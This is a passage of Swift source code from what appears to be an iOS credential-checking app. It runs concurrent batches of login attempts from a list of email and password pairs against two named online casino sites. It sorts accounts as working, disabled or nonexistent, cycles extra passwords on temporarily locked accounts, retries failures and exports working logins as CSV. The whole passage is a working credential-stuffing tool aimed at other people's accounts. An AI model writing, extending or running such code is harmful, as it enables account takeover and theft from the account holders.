            log("Dual mode: forced TRUE DETECTION as default for both sites")
        }

        batchTask = Task {
            configureEngine()
            engine.automationSettings.trueDetectionEnabled = true
            engine.automationSettings.trueDetectionPriority = true
            secondaryEngine.automationSettings.trueDetectionEnabled = true
            secondaryEngine.automationSettings.trueDetectionPriority = true

            var batchWorking = 0
            var batchDead = 0
            var batchRequeued = 0
            var joeRunning = 0
            var ignRunning = 0

            await withTaskGroup(of: Void.self) { group in
                var joeIndex = 0
                var ignIndex = 0

                while (joeIndex < credsToTest.count || ignIndex < credsToTest.count) && !isStopping && !Task.isCancelled {
                    if CrashProtectionService.shared.isMemoryEmergency {
                        self.log("Memory EMERGENCY during double batch — auto-stopping to prevent crash", level: .error)
                        self.isStopping = true
                        break
                    }

                    if !CrashProtectionService.shared.isMemorySafeForNewSession {
                        self.log("Memory pressure — waiting before spawning next double-site session", level: .warning)
                        let recovered = await CrashProtectionService.shared.waitForMemoryToDrop(timeout: 15)
                        if !recovered || Task.isCancelled {
                            self.isStopping = true
                            break
                        }
                    }

                    while isPaused && !isStopping && !Task.isCancelled {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    guard !isStopping && !Task.isCancelled else { break }

                    var launched = false

                    if joeIndex < credsToTest.count && joeRunning < joeSlots {
                        let cred = credsToTest[joeIndex]
                        joeIndex += 1
                        joeRunning += 1
                        launched = true
                        if cred.status != .testing { cred.status = .testing }
                        let attempt = LoginAttempt(credential: cred, sessionIndex: joeRunning)
                        self.attempts.insert(attempt, at: 0)
                        self.activeTestCount += 1
                        self.trimAttemptsIfNeeded()
                        let testURL = self.getNextTestURL(forSite: .joefortune)

                        group.addTask { [testTimeout] in
                            defer {
                                Task { @MainActor in
                                    self.activeTestCount = max(0, self.activeTestCount - 1)
                                    joeRunning = max(0, joeRunning - 1)
                                }
                            }
                            let outcome = await self.engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                            await MainActor.run {
                                self.batchCompletedCount = min(self.batchCompletedCount + 1, self.batchTotalCount)
                                attempt.logs.insert(PPSRLogEntry(message: "[JOE] Tested on \(testURL.host ?? "")", level: .info), at: 0)
                                self.handleOutcome(outcome, credential: cred, attempt: attempt)
                                self.updateRecoveryForOutcome(outcome, credential: cred, attempt: attempt)
                                if outcome == .success { batchWorking += 1; self.batchSuccessCount += 1 }
                                else if cred.status == .untested { batchRequeued += 1 }
                                else { batchDead += 1; self.batchFailCount += 1 }
                                self.persistCredentials()
                            }
                        }
                    }

                    if ignIndex < credsToTest.count && ignRunning < ignSlots {
                        let cred = credsToTest[ignIndex]
                        ignIndex += 1
                        ignRunning += 1
                        launched = true
                        if cred.status != .testing { cred.status = .testing }
                        let attempt = LoginAttempt(credential: cred, sessionIndex: ignRunning)
                        self.attempts.insert(attempt, at: 0)
                        self.activeTestCount += 1
                        self.trimAttemptsIfNeeded()
                        let testURL = self.getNextTestURL(forSite: .ignition)

                        group.addTask { [testTimeout] in
                            defer {
                                Task { @MainActor in
                                    self.activeTestCount = max(0, self.activeTestCount - 1)
                                    ignRunning = max(0, ignRunning - 1)
                                }
                            }
                            let outcome = await self.secondaryEngine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                            await MainActor.run {
                                self.batchCompletedCount = min(self.batchCompletedCount + 1, self.batchTotalCount)
                                attempt.logs.insert(PPSRLogEntry(message: "[IGN] Tested on \(testURL.host ?? "")", level: .info), at: 0)
                                self.handleOutcome(outcome, credential: cred, attempt: attempt)
                                self.updateRecoveryForOutcome(outcome, credential: cred, attempt: attempt)
                                if outcome == .success { batchWorking += 1; self.batchSuccessCount += 1 }
                                else if cred.status == .untested { batchRequeued += 1 }
                                else { batchDead += 1; self.batchFailCount += 1 }
                                self.persistCredentials()
                            }
                        }
                    }

                    if !launched {
                        await group.next()
                    }
                }

                await group.waitForAll()
            }

            syncActiveTestCount()
            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func updateRecoveryForOutcome(_ outcome: LoginOutcome, credential: LoginCredential, attempt: LoginAttempt) {
        let outcomeLabel: String
        switch outcome {
        case .success: outcomeLabel = "success"
        case .noAcc: outcomeLabel = "noAcc"
        case .permDisabled: outcomeLabel = "permDisabled"
        case .tempDisabled: outcomeLabel = "tempDisabled"
        case .unsure: outcomeLabel = "unsure"
        case .timeout: outcomeLabel = "timeout"
        case .connectionFailure: outcomeLabel = "connectionFailure"
        case .redBannerError: outcomeLabel = "redBannerError"
        case .smsDetected: outcomeLabel = "smsDetected"
        }

        switch outcome {
        case .success, .noAcc, .permDisabled, .tempDisabled:
            recoveryService.markCompleted(credentialId: credential.id)
        case .unsure, .timeout, .connectionFailure, .redBannerError, .smsDetected:
            let screenshotHash = attempt.screenshotIds.last
            recoveryService.updateSnapshot(
                credentialId: credential.id,
                retriesUsed: credential.testResults.count,
                lastScreenshotHash: screenshotHash,
                lastFailureReason: attempt.errorMessage,
                lastFailureOutcome: outcomeLabel
            )
        }
    }

    private func finalizeBatch(working: Int, dead: Int, requeued: Int) {
        let result = BatchResult(working: working, dead: dead, requeued: requeued, total: working + dead + requeued)
        lastBatchResult = result
        cancelPauseCountdown()
        stopHeartbeatMonitor()
        forceStopTask?.cancel()
        forceStopTask = nil
        persistence.clearTestQueue()
        if requeued == 0 { recoveryService.endBatch() }
        isRunning = false
        isPaused = false
        pauseCountdown = 0
        activeTestCount = 0
        batchStartTime = nil
        batchSiteLabel = ""

        let stoppedEarly = isStopping
        isStopping = false

        resetStuckTestingCredentials()
        syncActiveTestCount()
        trimAttemptsIfNeeded()
        backgroundService.endExtendedBackgroundExecution()

        if stoppedEarly {
            log("Batch stopped: \(working) working, \(dead) dead, \(requeued) requeued", level: .warning)
            logger.log("BATCH STOPPED: \(working) working, \(dead) dead, \(requeued) requeued", category: .login, level: .warning)
        } else {
            log("Batch complete: \(working) working, \(dead) dead, \(requeued) requeued", level: .success)
            logger.log("BATCH COMPLETE: \(working) working, \(dead) dead, \(requeued) requeued (\(result.alivePercentage)% alive)", category: .login, level: .success, metadata: ["working": "\(working)", "dead": "\(dead)", "requeued": "\(requeued)"])
        }

        if autoRetryEnabled && requeued > 0 {
            let retryCreds = credentials.filter { cred in
                cred.status == .untested && (autoRetryBackoffCounts[cred.id] ?? 0) < autoRetryMaxAttempts
            }
            if !retryCreds.isEmpty {
                let retryCount = retryCreds.count
                for cred in retryCreds {
                    autoRetryBackoffCounts[cred.id, default: 0] += 1
                }
                let backoffDelay = Double(autoRetryBackoffCounts.values.max() ?? 1) * 5.0
                log("Auto-retry: \(retryCount) credential(s) scheduled for retry in \(Int(backoffDelay))s", level: .info)
                Task {
                    try? await Task.sleep(for: .seconds(backoffDelay))
                    guard !self.isRunning else { return }
                    self.testSingleSiteBatch(retryCreds)
                }
            }
        }

        showBatchResultPopup = true
        notifications.sendBatchComplete(working: working, dead: dead, requeued: requeued)
        persistCredentials()

        autoTriggerTempDisabledPasswordCheck()
    }

    private func resetStuckTestingCredentials() {
        var resetCount = 0
        for cred in credentials where cred.status == .testing {
            cred.status = .untested
            resetCount += 1
        }
        if resetCount > 0 {
            log("Reset \(resetCount) stuck testing credential(s) back to untested", level: .warning)
        }
    }

    func pauseQueue() {
        isPaused = true
        pauseCountdown = 60
        log("Queue paused for 60 seconds — all sessions frozen, auto-resume in 60s", level: .warning)
        startPauseCountdown()
    }

    func resumeQueue() {
        cancelPauseCountdown()
        isPaused = false
        pauseCountdown = 0
        log("Queue resumed", level: .info)
    }

    func stopQueue() {
        cancelPauseCountdown()
        isStopping = true
        isPaused = false
        pauseCountdown = 0
        log("Stopping queue — current batch sessions completing, no new batches will be added", level: .warning)
        startForceStopTimer()
    }

    func stopAfterCurrent() {
        cancelPauseCountdown()
        isStopping = true
        isPaused = false
        pauseCountdown = 0
        log("Stopping after current batch due to unusual failures...", level: .warning)
        startForceStopTimer()
    }

    private func startForceStopTimer() {
        forceStopTask?.cancel()
        let forceStopTimeout = TimeoutResolver.resolveAutomationTimeout(20)
        forceStopTask = Task {
            try? await Task.sleep(for: .seconds(forceStopTimeout))
            guard !Task.isCancelled else { return }
            guard isRunning || isStopping else { return }
            log("Force-stop: batch did not finish within \(Int(forceStopTimeout))s — force cancelling", level: .error)
            logger.log("Force-stop triggered — cancelling hung batch task", category: .login, level: .error)
            batchTask?.cancel()
            secondaryBatchTask?.cancel()
            forceFinalizeBatch()
        }
    }

    private func forceFinalizeBatch() {
        cancelPauseCountdown()
        stopHeartbeatMonitor()
        forceStopTask?.cancel()
        forceStopTask = nil
        persistence.clearTestQueue()
        recoveryService.endBatch()
        isRunning = false
        isPaused = false
        isStopping = false
        pauseCountdown = 0
        activeTestCount = 0
        batchTotalCount = 0
        batchCompletedCount = 0
        batchSuccessCount = 0
        batchFailCount = 0
        batchStartTime = nil
        batchSiteLabel = ""
        batchTask = nil
        secondaryBatchTask = nil
        resetStuckTestingCredentials()
        syncActiveTestCount()
        trimAttemptsIfNeeded()
        backgroundService.endExtendedBackgroundExecution()
        log("Force-stop complete — all state reset", level: .warning)
        persistCredentials()
    }

    func emergencyStop() {
        logger.log("LoginViewModel: EMERGENCY STOP triggered by crash protection", category: .system, level: .critical)
        batchTask?.cancel()
        secondaryBatchTask?.cancel()
        batchTask = nil
        secondaryBatchTask = nil
        forceFinalizeBatch()
        WebViewPool.shared.forceResetCount()
    }

    private func startPauseCountdown() {
        pauseCountdownTask?.cancel()
        pauseCountdownTask = Task {
            for tick in stride(from: 59, through: 0, by: -1) {
                try? await Task.sleep(for: .seconds(1))
                guard !Task.isCancelled else { return }
                if !isPaused { return }
                pauseCountdown = tick
            }
            guard !Task.isCancelled, isPaused else { return }
            isPaused = false
            pauseCountdown = 0
            log("Pause timer expired — queue auto-resumed", level: .info)
        }
    }

    private func cancelPauseCountdown() {
        pauseCountdownTask?.cancel()
        pauseCountdownTask = nil
    }

    private func syncActiveTestCount() {
        let actualActive = attempts.filter({ !$0.status.isTerminal }).count
        if activeTestCount != actualActive {
            log("activeTestCount sync: \(activeTestCount) → \(actualActive)", level: .warning)
            activeTestCount = actualActive
        }
    }

    private func startHeartbeatMonitor() {
        heartbeatTask?.cancel()
        heartbeatTask = Task {
            while !Task.isCancelled && isRunning {
                try? await Task.sleep(for: .seconds(15))
                guard !Task.isCancelled, isRunning else { break }
                let now = Date()
                var stuckCount = 0
                for attempt in attempts where !attempt.status.isTerminal {
                    guard let started = attempt.startedAt else { continue }
                    let elapsed = now.timeIntervalSince(started)
                    if elapsed > sessionHeartbeatTimeout && attempt.status != .queued {
                        attempt.status = .failed
                        attempt.errorMessage = "Session stuck for \(Int(elapsed))s — force terminated by heartbeat"
                        attempt.completedAt = now
                        if let cred = credentials.first(where: { $0.id == attempt.credential.id }), cred.status == .testing {
                            cred.status = .untested
                            stuckCount += 1
                        }
                    }
                }
                syncActiveTestCount()
                if stuckCount > 0 {
                    log("Heartbeat: force-terminated \(stuckCount) stuck session(s) (>\(Int(sessionHeartbeatTimeout))s)", level: .warning)
                    logger.log("Heartbeat terminated \(stuckCount) stuck login sessions", category: .login, level: .warning)
                    persistCredentials()
                }
            }
        }
    }

    private func stopHeartbeatMonitor() {
        heartbeatTask?.cancel()
        heartbeatTask = nil
    }

    func retestCredential(_ cred: LoginCredential) {
        cred.status = .untested
        testSingleCredential(cred)
    }

    func clearHistory() {
        attempts.removeAll(where: { $0.status.isTerminal })
        log("Cleared completed attempts")
    }

    func clearAll() {
        attempts.removeAll()
        globalLogs.removeAll()
    }

    func exportWorkingCredentials() -> String {
        workingCredentials.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentials(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        return creds.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentialsCSV(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        var csv = "Email,Password,Status,Tests,Success Rate\n"
        for cred in creds {
            csv += "\(cred.username),\(cred.password),\(cred.status.rawValue),\(cred.totalTests),\(String(format: "%.0f%%", cred.successRate * 100))\n"
        }
        return csv
    }

    nonisolated enum CredentialExportFilter: String, CaseIterable, Sendable {
        case all = "All"
        case untested = "Untested"
        case working = "Working"
        case tempDisabled = "Temp Disabled"
        case permDisabled = "Perm Disabled"
        case noAcc = "No Acc"
        case unsure = "Unsure"

        var id: String { rawValue }
    }

    private let maxInMemoryScreenshots: Int = 200

    func addScreenshot(_ screenshot: PPSRDebugScreenshot) {
        if isRunning && CrashProtectionService.shared.isMemoryCritical {
            ScreenshotCacheService.shared.store(screenshot.image, forKey: screenshot.id)
            return
        }
        debugScreenshots.insert(screenshot, at: 0)
        let effectiveLimit = isRunning ? min(15, maxInMemoryScreenshots) : maxInMemoryScreenshots
        if debugScreenshots.count > effectiveLimit {
            let overflow = Array(debugScreenshots.suffix(from: effectiveLimit))
            for ss in overflow {
                ScreenshotCacheService.shared.store(ss.image, forKey: ss.id)
            }
            debugScreenshots.removeLast(debugScreenshots.count - effectiveLimit)
        }
    }

    func clearDebugScreenshots() {
        let count = debugScreenshots.count
        debugScreenshots.removeAll()
        log("Cleared \(count) debug screenshots")
    }

    func handleMemoryPressure() {
        let before = debugScreenshots.count
        let keep = min(50, maxInMemoryScreenshots / 4)
        if debugScreenshots.count > keep {
            let overflow = Array(debugScreenshots.suffix(from: keep))
            for ss in overflow {
                ScreenshotCacheService.shared.store(ss.image, forKey: ss.id)
            }
            debugScreenshots.removeLast(debugScreenshots.count - keep)
            log("Memory pressure: flushed \(before - keep) screenshots to disk cache", level: .warning)
        }
    }

    private func autoTriggerTempDisabledPasswordCheck() {
        let tempWithPasswords = credentials.filter {
            $0.status == .tempDisabled && !$0.assignedPasswords.isEmpty && $0.nextPasswordIndex < $0.assignedPasswords.count
        }
        guard !tempWithPasswords.isEmpty else { return }
        let totalUntested = tempWithPasswords.reduce(0) { $0 + $1.untestedPasswordCount }
        log("AUTO-TRIGGER: \(tempWithPasswords.count) temp disabled account(s) with \(totalUntested) untested password(s) — starting password check", level: .success)
        logger.log("Auto-triggering temp disabled password check: \(tempWithPasswords.count) accounts, \(totalUntested) passwords", category: .login, level: .info)
        runTempDisabledPasswordCheck()
    }

    func runTempDisabledPasswordCheck() {
        tempDisabledService.runPasswordCheck(
            credentials: credentials,
            getURL: { [weak self] in self?.getNextTestURL() ?? URL(string: "https://example.com") ?? URL(fileURLWithPath: "/") },
            persistCredentials: { [weak self] in self?.persistCredentials() },
            onLog: { [weak self] message, level in self?.log(message, level: level) }
        )
    }

    func assignPasswordsToTempDisabled(_ cred: LoginCredential, passwords: [String]) {
        cred.assignedPasswords = passwords
        cred.nextPasswordIndex = 0
        log("Assigned \(passwords.count) passwords to \(cred.username)")
        persistCredentials()
    }

    func runDisabledCheck(emails: [String]) {
        disabledCheckService.runCheck(emails: emails) { [weak self] results in
            guard let self else { return }
            let disabled = results.filter(\.isDisabled)
            if !disabled.isEmpty {
                self.log("Disabled check complete: \(disabled.count) perm disabled found", level: .warning)
            } else {
                self.log("Disabled check complete: no disabled accounts found", level: .success)
            }
        }
    }

    func applyDisabledCheckResults() {
        let disabledEmails = Set(disabledCheckService.disabledResults.map(\.email))
        var updated = 0
        for cred in credentials {
            if disabledEmails.contains(cred.username.lowercased()) && cred.status != .permDisabled {
                cred.status = .permDisabled
                updated += 1
            }
        }
        if updated > 0 {
            log("Updated \(updated) credentials to perm disabled from check results", level: .warning)
            persistCredentials()
        }
    }

    func addDisabledToBlacklist() {
        let emails = disabledCheckService.disabledResults.map(\.email)
        blacklistService.addMultipleToBlacklist(emails, reason: "Disabled check")
        log("Added \(emails.count) disabled accounts to blacklist", level: .success)
    }

    func correctResult(for screenshot: PPSRDebugScreenshot, override: UserResultOverride) {
        screenshot.userOverride = override

        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Correction: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }

        let isPass = override == .markedPass
        if isPass {
            cred.status = .working
            if let lastResult = cred.testResults.first, !lastResult.success {
                let corrected = LoginTestResult(success: true, duration: lastResult.duration, errorMessage: nil, responseDetail: "User corrected to PASS", timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        } else {
            cred.status = .noAcc
            if let lastResult = cred.testResults.first, lastResult.success {
                let corrected = LoginTestResult(success: false, duration: lastResult.duration, errorMessage: "User corrected to FAIL", responseDetail: nil, timestamp: lastResult.timestamp)
                cred.testResults.insert(corrected, at: 0)
            }
        }

        let label = isPass ? "PASS" : "FAIL"
        log("Debug correction: \(cred.username) marked as \(label) by user", level: isPass ? .success : .error)
        persistCredentials()
    }

    func resetScreenshotOverride(_ screenshot: PPSRDebugScreenshot) {
        screenshot.userOverride = .none
        log("Reset override for screenshot at \(screenshot.formattedTime)")
    }

    func requeueCredentialFromScreenshot(_ screenshot: PPSRDebugScreenshot) {
        guard let cred = credentials.first(where: { $0.id == screenshot.cardId }) else {
            log("Requeue: could not find credential \(screenshot.cardDisplayNumber)", level: .warning)
            return
        }
        cred.status = .untested
        log("Requeued \(cred.username) for retesting", level: .info)
        persistCredentials()
    }

    func screenshotsForCredential(_ credId: String) -> [PPSRDebugScreenshot] {
        debugScreenshots.filter { $0.cardId == credId }
    }

    func screenshotsForAttempt(_ attempt: LoginAttempt) -> [PPSRDebugScreenshot] {
        let ids = Set(attempt.screenshotIds)
        return debugScreenshots.filter { ids.contains($0.id) }
    }

    private func requeueCredentialToBottom(_ credential: LoginCredential) {
        if let idx = credentials.firstIndex(where: { $0.id == credential.id }) {
            credentials.remove(at: idx)
            credentials.append(credential)
        }
    }

    private func requeueCredentialWithPriority(_ credential: LoginCredential, entry: RequeueEntry) {
        guard let idx = credentials.firstIndex(where: { $0.id == credential.id }) else { return }
        credentials.remove(at: idx)

        switch entry.priority {
        case .high:
            let firstUntested = credentials.firstIndex(where: { $0.status == .untested }) ?? credentials.count
            credentials.insert(credential, at: firstUntested)
        case .medium:
            let midPoint = credentials.count / 2
            let insertIdx = min(midPoint, credentials.count)
            credentials.insert(credential, at: insertIdx)
        case .low:
            credentials.append(credential)
        }
    }

    private var pendingLogs: [PPSRLogEntry] = []
    private var logFlushTask: Task<Void, Never>?

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        pendingLogs.append(PPSRLogEntry(message: message, level: level))
        if level == .error || pendingLogs.count >= 10 {
            flushLogs()
        } else {
            scheduleLogFlush()
        }
        let debugLevel: DebugLogLevel
        switch level {
        case .info: debugLevel = .info
        case .success: debugLevel = .success
        case .warning: debugLevel = .warning
        case .error: debugLevel = .error
        }
        logger.log(message, category: .login, level: debugLevel)
    }

    private func scheduleLogFlush() {
        guard logFlushTask == nil else { return }
        logFlushTask = Task { [weak self] in
            try? await Task.sleep(for: .milliseconds(150))
            guard !Task.isCancelled else { return }
            self?.flushLogs()
        }
    }

    private func flushLogs() {
        logFlushTask = nil
        guard !pendingLogs.isEmpty else { return }
        let batch = pendingLogs
        pendingLogs.removeAll()
        globalLogs.insert(contentsOf: batch.reversed(), at: 0)
        if globalLogs.count > 1500 {
            globalLogs.removeLast(globalLogs.count - 1500)
        }
    }

    private let maxAttemptHistory: Int = 500
    private let maxAttemptsInBatch: Int = 500

    func trimAttemptsIfNeeded() {
        let hardCap = isRunning ? maxAttemptsInBatch : maxAttemptHistory
        if attempts.count > hardCap {
            let terminal = attempts.enumerated().filter { $0.element.status.isTerminal }
            if terminal.count > hardCap / 2 {
                let toRemove = terminal.suffix(terminal.count - hardCap / 2)
                let removeIds = Set(toRemove.map { $0.element.id })
                attempts.removeAll { removeIds.contains($0.id) }
            }
        }
        let terminal = attempts.filter { $0.status.isTerminal }
        if terminal.count > maxAttemptHistory {
            let excess = terminal.count - maxAttemptHistory
            let oldestTerminalIds = Set(terminal.suffix(excess).map(\.id))
            attempts.removeAll { oldestTerminalIds.contains($0.id) }
        }
    }
}
